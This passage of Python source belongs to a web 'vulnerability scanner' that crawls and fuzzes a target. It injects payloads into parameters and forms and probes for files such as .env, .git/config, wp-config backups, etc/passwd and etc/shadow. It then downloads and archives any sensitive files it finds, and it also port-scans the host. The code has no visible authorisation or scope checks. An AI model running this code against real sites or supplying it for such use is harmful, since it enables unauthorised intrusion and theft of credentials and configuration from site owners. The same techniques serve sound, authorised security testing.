                })
        
        # Download files in batches
        batch_size = 3 if IOS_MODE else 10
        total_files = len(all_files)
        
        logger.info(f"Total files to download: {total_files}")
        
        for i in range(0, total_files, batch_size):
            batch = all_files[i:i + batch_size]
            tasks = []
            
            for file_info in batch:
                url = file_info['url']
                filename = self.extract_filename_from_url(url)
                
                # Create safe filename
                safe_filename = re.sub(r'[^\w\-_\.]', '_', filename)
                if not safe_filename:
                    safe_filename = f"file_{hash(url) % 10000}"
                
                save_path = target_dir / safe_filename
                
                # Download task
                task = self.downloader.download_file(session, url, save_path)
                tasks.append((task, file_info))
            
            # Execute batch
            for task, file_info in tasks:
                try:
                    success = await task
                    if success:
                        if file_info['type'] == 'sensitive':
                            self.scan_stats['sensitive_files_found'] += 1
                        elif file_info['type'] == 'js':
                            self.scan_stats['js_files_downloaded'] += 1
                        self.scan_stats['files_downloaded'] += 1
                except Exception as e:
                    logger.error(f"Error downloading {file_info['url']}: {str(e)}", exc_info=True)
            
            # Progress
            progress = min(i + batch_size, total_files)
            percent = (progress / total_files) * 100 if total_files > 0 else 0
            sys.stdout.write(C.info(f"  Download Progress: {progress}/{total_files} ({percent:.1f}%)", end='\r'))
            sys.stdout.flush()
            
            # Small delay to avoid overwhelming
            await asyncio.sleep(0.1)
        
        print()
        logger.info(f"Download completed. Total downloaded: {self.scan_stats['files_downloaded']}")
        
        # Create summary report - FIXED: Always return dictionary
        report = self.downloader.create_summary_report(domain)
        
        # Save report
        report_file = target_dir / "download_report.json"
        try:
            with open(report_file, 'w') as f:
                json.dump(report, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving report: {str(e)}")
        
        # Create archive
        archive_path = self.downloader.create_archive(domain)
        
        return {
            'total_downloaded': report.get('total_files', 0),
            'sensitive_files': report.get('sensitive_files', []),
            'js_files': report.get('js_files', []),
            'total_size': report.get('total_size', 0),
            'report_path': str(report_file),
            'archive_path': archive_path
        }
    
    def extract_filename_from_url(self, url):
        """Extract filename from URL"""
        try:
            parsed = urlparse(url)
            path = parsed.path
            if path:
                filename = Path(path).name
                if filename:
                    return filename
            
            # Try to get from query parameters
            query = parsed.query
            if 'file=' in query:
                match = re.search(r'file=([^&]+)', query)
                if match:
                    return match.group(1)
            
            # Generate from URL
            return f"file_{hash(url) % 10000}"
        except:
            return f"file_{hash(url) % 10000}"
    
    async def analyze_target(self, url):
        """Comprehensive target analysis"""
        print(C.info(f"Analyzing target: {url}"))
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Initial reconnaissance
        result = await self.smart_request(base_url)
        if not result['success']:
            return {'error': f"Failed to access target: {result.get('error', 'Unknown')}"}
        
        # Parse HTML
        parser = SmartHTMLParser(base_url)
        parser.feed(result['content'])
        html_analysis = parser.get_analysis()
        
        # Technology detection
        tech_stack = await self.detect_technologies(result)
        
        # Security headers check
        security_headers = self.check_security_headers(result['headers'])
        
        # SSL/TLS check
        ssl_info = await self.check_ssl(parsed.netloc)
        
        # Initial assessment
        assessment = {
            'url': base_url,
            'domain': parsed.netloc,
            'accessible': True,
            'response_time': result['time'],
            'status_code': result['status'],
            'content_size': result['size'],
            'content_type': result['content_type'],
            'technologies': tech_stack,
            'security_headers': security_headers,
            'ssl_info': ssl_info,
            'html_analysis': html_analysis,
            'server_info': result.get('server', 'Unknown'),
            'powered_by': result['headers'].get('X-Powered-By', 'Not disclosed'),
            'cookies': self.extract_cookies(result['headers']),
            'redirects': result.get('redirects', 0)
        }
        
        self.target_info = assessment
        return assessment
    
    async def detect_technologies(self, response_data):
        """AI-Powered technology detection"""
        content = response_data['content'].lower()
        headers = {k.lower(): v for k, v in response_data['headers'].items()}
        
        detected = {}
        confidence = {}
        
        for category, technologies in TECH_DATABASE.items():
            detected[category] = []
            confidence[category] = {}
            
            for tech, patterns in technologies.items():
                matches = []
                
                for pattern in patterns:
                    pattern_lower = pattern.lower()
                    
                    # Check in content
                    if pattern_lower in content:
                        matches.append(f"content:{pattern}")
                    
                    # Check in headers
                    for header_name, header_value in headers.items():
                        if pattern_lower in header_value.lower():
                            matches.append(f"header:{header_name}:{pattern}")
                
                if matches:
                    detected[category].append(tech)
                    confidence[category][tech] = {
                        'matches': len(matches),
                        'confidence': min(100, len(matches) * 20),
                        'evidence': matches[:3]
                    }
        
        # Clean up empty categories
        detected = {k: v for k, v in detected.items() if v}
        confidence = {k: v for k, v in confidence.items() if v}
        
        return {
            'technologies': detected,
            'confidence': confidence,
            'total_technologies': sum(len(v) for v in detected.values())
        }
    
    def check_security_headers(self, headers):
        """Check security headers comprehensively"""
        results = {}
        missing_headers = []
        
        for header, info in SECURITY_HEADERS.items():
            if header in headers:
                results[header] = {
                    'present': True,
                    'value': headers[header][:200],
                    'recommended': info['recommended'],
                    'severity': info['severity'],
                    'description': info['description']
                }
                
                # Check if value matches recommendation
                if info['recommended']:
                    if info['recommended'] in headers[header]:
                        results[header]['status'] = 'Good'
                    else:
                        results[header]['status'] = 'Warning'
                else:
                    results[header]['status'] = 'Present'
            else:
                results[header] = {
                    'present': False,
                    'value': None,
                    'recommended': info['recommended'],
                    'severity': info['severity'],
                    'description': info['description'],
                    'status': 'Missing'
                }
                missing_headers.append(header)
        
        present_count = sum(1 for h in results.values() if h['present'])
        good_count = sum(1 for h in results.values() if h.get('status') == 'Good')
        
        # Security score (0-100)
        security_score = 0
        if present_count > 0:
            security_score = int((good_count / len(SECURITY_HEADERS)) * 100)
        
        return {
            'headers': results,
            'present_count': present_count,
            'missing_count': len(missing_headers),
            'missing_headers': missing_headers,
            'security_score': security_score,
            'total_checked': len(SECURITY_HEADERS)
        }
    
    async def check_ssl(self, domain):
        """Check SSL/TLS configuration"""
        if not self.config.get('ssl_check', False):
            return {'performed': False}
        
        try:
            import ssl as ssl_module
            import socket
            
            context = ssl_module.create_default_context()
            
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    tls_version = ssock.version()
                    
                    # Check certificate expiry
                    not_after = cert.get('notAfter', '')
                    expiry_date = None
                    if not_after:
                        expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        days_to_expiry = (expiry_date - datetime.now()).days
                    
                    # Check for weak ciphers
                    weak_cipher = False
                    if cipher:
                        cipher_name = cipher[0]
                        for weak in SSL_CHECKS['weak_ciphers']:
                            if weak in cipher_name.upper():
                                weak_cipher = True
                                break
                    
                    return {
                        'valid': True,
                        'tls_version': tls_version,
                        'cipher': cipher,
                        'certificate': cert,
                        'expiry_date': str(expiry_date) if expiry_date else 'Unknown',
                        'days_to_expiry': days_to_expiry if expiry_date else None,
                        'weak_cipher': weak_cipher,
                        'protocols_supported': SSL_CHECKS['protocols']
                    }
                    
        except Exception as e:
            return {
                'valid': False,
                'error': str(e)
            }
    
    def extract_cookies(self, headers):
        """Extract and analyze cookies"""
        cookies = []
        if 'Set-Cookie' in headers:
            cookie_header = headers['Set-Cookie']
            # Simple cookie parsing
            cookie_parts = cookie_header.split(';')
            for part in cookie_parts:
                part = part.strip()
                if '=' in part:
                    name, value = part.split('=', 1)
                    cookies.append({
                        'name': name.strip(),
                        'value': value.strip()[:50],
                        'secure': 'Secure' in cookie_header,
                        'httponly': 'HttpOnly' in cookie_header,
                        'samesite': 'SameSite' in cookie_header
                    })
        return cookies
    
    async def smart_crawl(self, start_url):
        """Intelligent crawling with depth control"""
        if self.max_depth == 0:
            return {'crawled': 0, 'pages': []}
        
        print(C.info(f"Smart crawling (depth: {self.max_depth})..."))
        
        visited = set()
        to_visit = deque([(start_url, 0)])
        crawled_pages = []
        
        async def crawl_page(url, depth):
            if url in visited or depth > self.max_depth:
                return
            
            visited.add(url)
            
            result = await self.smart_request(url)
            if not result['success']:
                return
            
            # Parse page
            parser = SmartHTMLParser(url)
            parser.feed(result['content'])
            
            # Extract interesting data
            interesting = self.find_interesting_content(result['content'])
            
            page_info = {
                'url': url,
                'depth': depth,
                'status': result['status'],
                'size': result['size'],
                'title': self.extract_title(result['content']),
                'links_found': len(parser.links),
                'forms_found': len(parser.forms),
                'interesting_data': interesting,
                'server': result.get('server', ''),
                'content_type': result.get('content_type', '')
            }
            
            crawled_pages.append(page_info)
            
            # Add new links for next depth
            if depth < self.max_depth:
                for link in parser.links[:30]:  # Limit links per page
                    if link not in visited:
                        to_visit.append((link, depth + 1))
            
            # Rate limiting
            await asyncio.sleep(0.2)
        
        # Start crawling
        max_pages = 100 if self.scan_mode == 'Comprehensive' else 50
        while to_visit and len(visited) < max_pages:
            url, depth = to_visit.popleft()
            await crawl_page(url, depth)
            
            # Progress indicator
            progress = len(visited)
            if progress % 5 == 0:
                percent = (progress / max_pages) * 100
                sys.stdout.write(C.info(f"  Crawled {progress}/{max_pages} pages ({percent:.1f}%)", end='\r'))
                sys.stdout.flush()
        
        print()
        return {
            'crawled': len(crawled_pages),
            'pages': crawled_pages[:30],  # Return first 30 pages
            'total_visited': len(visited)
        }
    
    def find_interesting_content(self, content):
        """Find interesting patterns in content"""
        interesting = []
        
        # Email addresses
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', content)
        if emails:
            interesting.append({
                'type': 'Email Addresses',
                'count': len(emails),
                'samples': list(set(emails))[:5]
            })
        
        # Phone numbers
        phones = re.findall(r'\+?[0-9][0-9\s\-\(\)]{7,}[0-9]', content)
        if phones:
            interesting.append({
                'type': 'Phone Numbers',
                'count': len(phones),
                'samples': phones[:5]
            })
        
        # API keys patterns
        api_keys = re.findall(r'[A-Za-z0-9]{32,}', content)
        if api_keys:
            interesting.append({
                'type': 'Potential API Keys',
                'count': len(api_keys),
                'samples': api_keys[:3]
            })
        
        # JavaScript files
        js_files = re.findall(r'src=["\'][^"\']+\.js["\']', content)
        if js_files:
            interesting.append({
                'type': 'JavaScript Files',
                'count': len(js_files),
                'samples': js_files[:5]
            })
        
        return interesting
    
    def extract_title(self, html_content):
        """Extract page title"""
        title_match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).strip()[:100]
            return title
        
        # Try meta title
        meta_match = re.search(r'<meta[^>]*property=["\']og:title["\'][^>]*content=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
        if meta_match:
            return meta_match.group(1).strip()[:100]
        
        return "No Title Found"
    
    async def smart_fuzzing(self, base_url):
        """Intelligent directory fuzzing - FIXED PRINT ISSUE"""
        print(C.info(f"Smart fuzzing with {len(COMMON_PATHS)} common paths..."))
        
        # Select paths based on scan mode
        if self.scan_mode == 'Quick':
            paths = COMMON_PATHS[:50]
        elif self.scan_mode == 'Standard':
            paths = COMMON_PATHS[:100]
        elif self.scan_mode == 'Deep':
            paths = COMMON_PATHS[:200]
        elif self.scan_mode == 'Comprehensive':
            paths = COMMON_PATHS
        else:  # Pentest
            paths = COMMON_PATHS + self.generate_custom_paths()
        
        found_paths = []
        sensitive_files = []
        js_files = []
        
        async def test_path(path):
            test_url = urljoin(base_url, path)
            
            # Try HEAD first (faster)
            result = await self.smart_request(test_url, method='HEAD')
            
            if not result['success']:
                # Try GET if HEAD fails
                result = await self.smart_request(test_url, method='GET')
            
            if result['success']:
                status = result['status']
                size = result.get('size', 0)
                
                # Filter false positives
                if status < 400 or (400 <= status < 500 and size > 100):
                    # Check for interesting content
                    interesting = self.analyze_found_path(result['content'], path)
                    
                    found_info = {
                        'path': path,
                        'url': test_url,
                        'status': status,
                        'size': size,
                        'content_type': result.get('content_type', ''),
                        'server': result.get('server', ''),
                        'interesting': interesting,
                        'title': self.extract_title(result['content'])[:50]
                    }
                    
                    found_paths.append(found_info)
                    
                    # Check if sensitive file
                    filename = self.extract_filename_from_url(test_url)
                    is_sensitive, category = self.downloader.is_sensitive_file(filename)
                    if is_sensitive:
                        sensitive_files.append({
                            'url': test_url,
                            'filename': filename,
                            'category': category,
                            'size': size,
                            'status': status
                        })
                    
                    # Check if JS file
                    if filename.endswith('.js'):
                        js_files.append({
                            'url': test_url,
                            'filename': filename,
                            'size': size,
                            'status': status
                        })
        
        # Test in batches
        batch_size = 5 if IOS_MODE else 15
        for i in range(0, len(paths), batch_size):
            batch = paths[i:i + batch_size]
            tasks = [test_path(path) for path in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Progress - FIXED: Use sys.stdout.write instead of print with end parameter
            progress = min(i + batch_size, len(paths))
            percent = (progress / len(paths)) * 100
            sys.stdout.write(C.info(f"  Progress: {progress}/{len(paths)} ({percent:.1f}%)", end='\r'))
            sys.stdout.flush()
            
            # Small delay to avoid overwhelming
            await asyncio.sleep(0.1)
        
        print()  # New line after progress
        
        # Sort by status code and size
        found_paths.sort(key=lambda x: (x['status'], -x['size']))
        
        return {
            'tested': len(paths),
            'found': len(found_paths),
            'paths': found_paths[:50],  # Return top 50
            'sensitive_files': sensitive_files,
            'js_files': js_files
        }
    
    def generate_custom_paths(self):
        """Generate custom paths based on target analysis"""
        custom_paths = []
        
        if self.target_info:
            tech = self.target_info.get('technologies', {}).get('technologies', {})
            
            # WordPress specific paths
            if any('WordPress' in t for t in tech.get('Backend', [])):
                custom_paths.extend([
                    'wp-admin/admin-ajax.php',
                    'wp-admin/install.php',
                    'wp-content/plugins/',
                    'wp-content/themes/',
                    'wp-includes/js/',
                    'wp-config.php.backup',
                    'wp-config.php.save'
                ])
            
            # Laravel specific paths
            if 'Laravel' in tech.get('Backend', []):
                custom_paths.extend([
                    '.env',
                    'storage/logs/laravel.log',
                    'database/seeds/',
                    'app/Http/Controllers/',
                    'config/database.php'
                ])
            
            # Django specific paths
            if 'Django' in tech.get('Backend', []):
                custom_paths.extend([
                    'admin/',
                    'static/admin/',
                    'media/',
                    'static/',
                    'manage.py'
                ])
            
            # Node.js specific paths
            if 'Node.js' in tech.get('Backend', []):
                custom_paths.extend([
                    'package.json',
                    'package-lock.json',
                    '.env',
                    'config/',
                    'server.js',
                    'app.js',
                    'index.js'
                ])
            
            # Apache specific paths
            if 'Apache' in tech.get('Server', []):
                custom_paths.extend([
                    '.htaccess',
                    '.htpasswd',
                    'server-status',
                    'server-info'
                ])
        
        return custom_paths
    
    def analyze_found_path(self, content, path):
        """Analyze found path content for interesting information"""
        interesting = []
        
        # Check for error messages
        error_indicators = ['error', 'exception', 'warning', 'fatal', 'stack trace']
        if any(indicator in content.lower() for indicator in error_indicators):
            interesting.append('Error messages found')
        
        # Check for configuration data
        config_indicators = ['password', 'database', 'host', 'user', 'pass', 'key']
        if any(indicator in content.lower() for indicator in config_indicators):
            interesting.append('Configuration data found')
        
        # Check for source code
        if any(ext in path for ext in ['.php', '.asp', '.jsp', '.py', '.rb']):
            if '<?php' in content or '<%' in content:
                interesting.append('Source code exposed')
        
        return interesting
    
    async def vulnerability_assessment(self, base_url):
        """Intelligent vulnerability assessment"""
        print(C.info("Running vulnerability assessment..."))
        
        vulnerabilities = []
        sensitive_files = []
        
        # Get parameters from target analysis
        params = self.target_info.get('html_analysis', {}).get('parameters', [])
        forms = self.target_info.get('html_analysis', {}).get('forms', [])
        
        # Test GET parameters
        for param in params[:15]:  # Test first 15 parameters
            for vuln_type, vuln_data in VULN_PATTERNS.items():
                for payload in vuln_data['payloads'][:3]:  # Test first 3 payloads
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    result = await self.smart_request(test_url)
                    
                    if result['success']:
                        content_lower = result['content'].lower()
                        indicators = vuln_data['indicators']
                        
                        if any(indicator in content_lower for indicator in indicators):
                            vulnerabilities.append({
                                'type': vuln_type,
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'severity': vuln_data.get('severity', 'Medium'),
                                'evidence': 'Response contains error indicators',
                                'status_code': result['status']
                            })
                            break
        
        # Test forms
        for form in forms[:5]:  # Test first 5 forms
            for input_field in form.get('inputs', []):
                input_name = input_field.get('name', '')
                if input_name:
                    for vuln_type, vuln_data in VULN_PATTERNS.items():
                        for payload in vuln_data['payloads'][:2]:
                            # Create POST data
                            post_data = {input_name: payload}
                            result = await self.smart_request(
                                urljoin(base_url, form.get('action', '')),
                                method='POST',
                                data=post_data
                            )
                            
                            if result['success']:
                                content_lower = result['content'].lower()
                                indicators = vuln_data['indicators']
                                
                                if any(indicator in content_lower for indicator in indicators):
                                    vulnerabilities.append({
                                        'type': vuln_type,
                                        'form': form.get('action', ''),
                                        'parameter': input_name,
                                        'payload': payload,
                                        'method': 'POST',
                                        'severity': vuln_data.get('severity', 'Medium'),
                                        'evidence': 'Response contains error indicators',
                                        'status_code': result['status']
                                    })
                                    break
        
        # Check for common sensitive files
        sensitive_file_list = [
            '.env', '.git/HEAD', '.git/config', 'config.php', 'backup.zip',
            'phpinfo.php', 'server-status', 'wp-config.php', '.htaccess',
            'web.config', 'appsettings.json', 'database.yml', 'settings.py',
            'docker-compose.yml', 'dockerfile', 'package.json', 'composer.json',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml'
        ]
        
        # Add server configuration files to check
        server_config_files = [
            'etc/passwd', 'etc/shadow', 'etc/hosts',
            'etc/apache2/apache2.conf', 'etc/nginx/nginx.conf',
            'etc/php/php.ini', 'etc/mysql/my.cnf',
            'var/log/apache2/access.log', 'var/log/nginx/error.log'
        ]
        
        sensitive_file_list.extend(server_config_files)
        
        for file in sensitive_file_list:
            test_url = urljoin(base_url, file)
            result = await self.smart_request(test_url)
            
            if result['success'] and result['status'] == 200:
                filename = self.extract_filename_from_url(test_url)
                is_sensitive, category = self.downloader.is_sensitive_file(filename)
                
                vulnerabilities.append({
                    'type': 'Sensitive File Exposure',
                    'file': file,
                    'url': test_url,
                    'severity': 'High',
                    'evidence': f'File is publicly accessible ({result["size"]} bytes)',
                    'status_code': result['status']
                })
                
                if is_sensitive:
                    sensitive_files.append({
                        'url': test_url,
                        'filename': filename,
                        'category': category,
                        'size': result['size'],
                        'status': result['status']
                    })
        
        # Check for open redirects
        redirect_params = ['redirect', 'url', 'next', 'return', 'returnUrl']
        for param in redirect_params:
            test_url = f"{base_url}?{param}=https://evil.com"
            result = await self.smart_request(test_url)
            if result['success'] and result.get('redirects', 0) > 0:
                vulnerabilities.append({
                    'type': 'Open Redirect',
                    'parameter': param,
                    'url': test_url,
                    'severity': 'Medium',
                    'evidence': f'Redirects to external domain'
                })
        
        self.scan_stats['vulnerabilities_found'] = len(vulnerabilities)
        
        return {
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities),
            'tested_params': len(params),
            'tested_forms': len(forms),
            'sensitive_files': sensitive_files
        }
    
    async def port_scan(self, domain):
        """Enhanced port scanning"""
        if not self.config.get('scan_ports', False):
            return {'performed': False}
        
        print(C.info(f"Scanning ports for {domain}..."))
        
        # Common web and service ports
        common_ports = [
            80, 443, 8080, 8443, 3000,  # Web
            22, 21, 23, 25, 53, 110, 143,  # Services
            3306, 5432, 27017, 6379, 9200,  # Databases
            8000, 8008, 8888, 9000,  # Dev ports
            3389, 5900,  # Remote access
        ]
        
        open_ports = []
        service_info = {}
        
        try:
            # Resolve domain
            ip = socket.gethostbyname(domain)
            
            async def check_port(port):
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port),
                        timeout=2.0
                    )
                    
                    # Try to get banner
                    writer.write(b'HEAD / HTTP/1.0\r\n\r\n')
                    await writer.drain()
                    
                    try:
                        banner = await asyncio.wait_for(reader.read(1024), timeout=1.0)
                        banner_text = banner.decode('utf-8', errors='ignore')[:200]
                    except:
                        banner_text = ''
                    
                    writer.close()
                    await writer.wait_closed()
                    
                    return port, banner_text
                except:
                    return port, None
            
            # Check ports in batches
            batch_size = 5
            for i in range(0, len(common_ports), batch_size):
                batch = common_ports[i:i + batch_size]
                tasks = [check_port(port) for port in batch]
                results = await asyncio.gather(*tasks)
                
                for port, banner in results:
                    if banner is not None:
                        open_ports.append(port)
                        service_info[port] = {
                            'banner': banner,
                            'service': self.detect_service(port, banner)
                        }
                
                # Progress
                progress = min(i + batch_size, len(common_ports))
                sys.stdout.write(C.info(f"  Ports checked: {progress}/{len(common_ports)}", end='\r'))
                sys.stdout.flush()
                await asyncio.sleep(0.1)
            
            print()
            
        except Exception as e:
            return {'error': str(e), 'open_ports': [], 'performed': True}
        
        return {
            'ip': ip,
            'open_ports': open_ports,
            'services': service_info,
            'total_checked': len(common_ports),
            'performed': True
        }
    
    def detect_service(self, port, banner):
        """Detect service from port and banner"""
        port_service_map = {
            80: 'HTTP',
            443: 'HTTPS',
            22: 'SSH',
            21: 'FTP',
            25: 'SMTP',
            53: 'DNS',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            27017: 'MongoDB',
            6379: 'Redis',
            9200: 'Elasticsearch',
            8080: 'HTTP Proxy',
            8443: 'HTTPS Alt',
        }
        
        service = port_service_map.get(port, 'Unknown')
        
        # Enhance with banner info
        banner_lower = banner.lower()
        if 'apache' in banner_lower:
            service = 'Apache HTTP'
        elif 'nginx' in banner_lower:
            service = 'Nginx'
        elif 'iis' in banner_lower:
            service = 'Microsoft IIS'
        elif 'mysql' in banner_lower:
            service = 'MySQL'
        elif 'postgres' in banner_lower:
            service = 'PostgreSQL'
        
        return service
    
    async def subdomain_scan(self, domain):
        """Scan for subdomains"""
        if not self.config.get('subdomain_scan', False):
            return {'performed': False}
        
        print(C.info(f"Scanning for subdomains of {domain}..."))
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev',
            'staging', 'api', 'secure', 'portal', 'blog',
            'shop', 'store', 'app', 'mobile', 'm',
            'static', 'cdn', 'assets', 'media', 'images',
            'support', 'help', 'docs', 'wiki', 'forum'
        ]
        
        found_subdomains = []
        
        async def check_subdomain(sub):
            test_url = f"https://{sub}.{domain}"
            try:
                result = await self.smart_request(test_url, method='HEAD')
                if result['success']:
                    return sub, result['status']
            except:
                pass
            return sub, None
        
        # Check subdomains
        batch_size = 10
        for i in range(0, len(common_subdomains), batch_size):
            batch = common_subdomains[i:i + batch_size]
            tasks = [check_subdomain(sub) for sub in batch]
            results = await asyncio.gather(*tasks)
            
            for sub, status in results:
                if status:
                    found_subdomains.append({
                        'subdomain': sub,
                        'url': f"https://{sub}.{domain}",
                        'status': status
                    })
            
            # Progress
            progress = min(i + batch_size, len(common_subdomains))
            sys.stdout.write(C.info(f"  Subdomains checked: {progress}/{len(common_subdomains)}", end='\r'))
            sys.stdout.flush()
            await asyncio.sleep(0.2)
        
        print()
        
        return {
            'found': len(found_subdomains),
            'subdomains': found_subdomains,
            'tested': len(common_subdomains),
            'performed': True
        }
    
    async def comprehensive_scan(self, target_url):
        """Complete AI-powered scan with file download"""
        print(C.highlight(f"\n{'='*60}"))
        print(C.highlight(f"🚀 AI-POWERED WEB SCANNER v{version} - PRODUCTION"))
        print(C.highlight(f"🖥️ ENHANCED WITH SERVER FILE DOWNLOADER"))
        print(C.highlight(f"{'='*60}"))
        print(C.info(f"Target: {target_url}"))
        print(C.info(f"Mode: {self.scan_mode}"))
        print(C.info(f"File Download: {'Enabled' if self.download_files else 'Disabled'}"))
        print(C.info(f"Server File Download: {'Enabled' if self.download_server_files else 'Disabled'}"))
        print(C.info(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
        print(C.highlight(f"{'='*60}\n"))
        
        scan_start = time.time()
        
        try:
            # Validate and parse URL
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'https://' + target_url
            
            parsed = urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            domain = parsed.netloc
            
            print(C.success(f"Target validated: {domain}"))
            
            # Results storage
            results = {
                'target': target_url,
                'domain': domain,
                'scan_mode': self.scan_mode,
                'auto_mode': self.auto_mode,
                'download_files': self.download_files,
                'download_server_files': self.download_server_files,
                'max_file_size': self.max_file_size,
                'save_directory': str(self.save_directory),
                'start_time': datetime.now().isoformat(),
                'ios_mode': IOS_MODE,
                'phases': [],
                'file_download': {},
                'server_file_download': {}
            }
            
            # Phase 1: Initial Analysis
            print(C.blue("\n[PHASE 1/8] Initial Analysis & Reconnaissance"))
            phase_start = time.time()
            analysis = await self.analyze_target(base_url)
            results['initial_analysis'] = analysis
            phase_time = time.time() - phase_start
            results['phases'].append({'phase': 'Initial Analysis', 'time': phase_time})
            print(C.success(f"  ✓ Technology stack identified"))
            print(C.success(f"  ✓ Security headers analyzed"))
            print(C.success(f"  ✓ SSL/TLS checked"))
            
            # Phase 2: Subdomain Scanning
            if self.config.get('subdomain_scan', False):
                print(C.blue("\n[PHASE 2/8] Subdomain Discovery"))
                phase_start = time.time()
                subdomain_results = await self.subdomain_scan(domain)
                results['subdomains'] = subdomain_results
                phase_time = time.time() - phase_start
                results['phases'].append({'phase': 'Subdomain Scan', 'time': phase_time})
                print(C.success(f"  ✓ Found {subdomain_results.get('found', 0)} subdomains"))
            
            # Phase 3: Smart Crawling
            if self.config.get('crawl_site', True) and self.max_depth > 0:
                print(C.blue("\n[PHASE 3/8] Smart Site Crawling"))
                phase_start = time.time()
                crawl_results = await self.smart_crawl(base_url)
                results['crawling'] = crawl_results
                phase_time = time.time() - phase_start
                results['phases'].append({'phase': 'Site Crawling', 'time': phase_time})
                print(C.success(f"  ✓ Crawled {crawl_results.get('crawled', 0)} pages"))
            
            # Phase 4: Intelligent Fuzzing
            print(C.blue("\n[PHASE 4/8] Intelligent Directory Fuzzing"))
            phase_start = time.time()
            fuzz_results = await self.smart_fuzzing(base_url)
            results['fuzzing'] = fuzz_results
            phase_time = time.time() - phase_start
            results['phases'].append({'phase': 'Directory Fuzzing', 'time': phase_time})
            print(C.success(f"  ✓ Tested {fuzz_results.get('tested', 0)} paths"))
            print(C.success(f"  ✓ Found {fuzz_results.get('found', 0)} accessible paths"))
            
            # Collect files for download
            all_sensitive_files = []
            all_js_files = []
            
            # From fuzzing
            all_sensitive_files.extend(fuzz_results.get('sensitive_files', []))
            all_js_files.extend(fuzz_results.get('js_files', []))
            
            # Phase 5: Vulnerability Assessment
            if self.config.get('vuln_scan', True):
                print(C.blue("\n[PHASE 5/8] Vulnerability Assessment"))
                phase_start = time.time()
                vuln_results = await self.vulnerability_assessment(base_url)
                results['vulnerabilities'] = vuln_results
                phase_time = time.time() - phase_start
                results['phases'].append({'phase': 'Vulnerability Scan', 'time': phase_time})
                print(C.success(f"  ✓ Found {vuln_results.get('count', 0)} potential vulnerabilities"))
                
                # Add sensitive files from vulnerability scan
                all_sensitive_files.extend(vuln_results.get('sensitive_files', []))
            
            # Phase 6: Server File Download (if enabled)
            if self.download_server_files:
                print(C.blue("\n[PHASE 6/8] Server Configuration File Download"))
                phase_start = time.time()
                
                # Get technology stack
                tech_stack = analysis.get('technologies', {})
                
                # Download server files
                server_results = await self.download_server_config_files(
                    domain=domain,
                    base_url=base_url,
                    tech_stack=tech_stack
                )
                
                results['server_file_download'] = server_results
                phase_time = time.time() - phase_start
                results['phases'].append({'phase': 'Server File Download', 'time': phase_time})
                
                if server_results.get('success'):
                    print(C.success(f"  ✓ Downloaded {server_results.get('total_downloaded', 0)} server files"))
                    if server_results.get('analysis', {}).get('interesting_findings'):
                        print(C.warning(f"  ⚠️ Found {len(server_results['analysis']['interesting_findings'])} interesting findings"))
            
            # Phase 7: Web File Download (if enabled)
            if self.download_files and (all_sensitive_files or all_js_files):
                print(C.blue("\n[PHASE 7/8] Web File Download"))
                phase_start = time.time()
                
                # Get JS files from HTML analysis
                html_js_files = analysis.get('html_analysis', {}).get('js_files', [])
                for js_info in html_js_files:
                    all_js_files.append({
                        'url': js_info.get('url', ''),
                        'filename': self.extract_filename_from_url(js_info.get('url', '')),
                        'size': 0,
                        'status': 0
                    })
                
                # Remove duplicates
                unique_sensitive = {f['url']: f for f in all_sensitive_files}.values()
                unique_js = {f['url']: f for f in all_js_files}.values()
                
                print(C.info(f"  Found {len(unique_sensitive)} sensitive files"))
                print(C.info(f"  Found {len(unique_js)} JavaScript files"))
                
                download_results = await self.download_found_files(
                    domain=domain,
                    sensitive_files=list(unique_sensitive),
                    js_files=list(unique_js)
                )
                
                results['file_download'] = download_results if download_results is not None else {}
                phase_time = time.time() - phase_start
                results['phases'].append({'phase': 'Web File Download', 'time': phase_time})
                
                if download_results:
                    print(C.success(f"  ✓ Downloaded {download_results.get('total_downloaded', 0)} web files"))
                    if download_results.get('archive_path'):
                        print(C.success(f"  ✓ Archive created: {download_results.get('archive_path')}"))
            
            # Phase 8: Network Analysis
            print(C.blue("\n[PHASE 8/8] Network Analysis"))
            phase_start = time.time()
            port_results = await self.port_scan(domain)
            results['network'] = port_results
            phase_time = time.time() - phase_start
            results['phases'].append({'phase': 'Network Scan', 'time': phase_time})
            
            if port_results.get('performed', False):
                print(C.success(f"  ✓ Found {len(port_results.get('open_ports', []))} open ports"))
            
            # Finalize results
            results['scan_complete'] = True
            results['total_time'] = time.time() - scan_start
            results['stats'] = self.scan_stats
            
            # Calculate security score
            security_score = self.calculate_security_score(results)
            results['security_score'] = security_score
            
            print(C.highlight(f"\n{'='*60}"))
            print(C.success(f"🎉 SCAN COMPLETED SUCCESSFULLY!"))
            print(C.info(f"⏱️  Total Time: {results['total_time']:.1f} seconds"))
            print(C.info(f"📊 Requests Made: {self.scan_stats['requests_made']}"))
            print(C.info(f"📥 Web Files Downloaded: {self.scan_stats['files_downloaded']}"))
            print(C.info(f"🖥️ Server Files Downloaded: {self.scan_stats['server_files_downloaded']}"))
            print(C.info(f"🛡️ Security Score: {security_score}/100"))
            print(C.highlight(f"{'='*60}"))
            
            return results
            
        except Exception as e:
            error_msg = str(e)
            print(C.error(f"\nScan Failed: {error_msg}"))
            logger.error(f"Scan failed: {error_msg}", exc_info=True)
            return {
                'success': False,
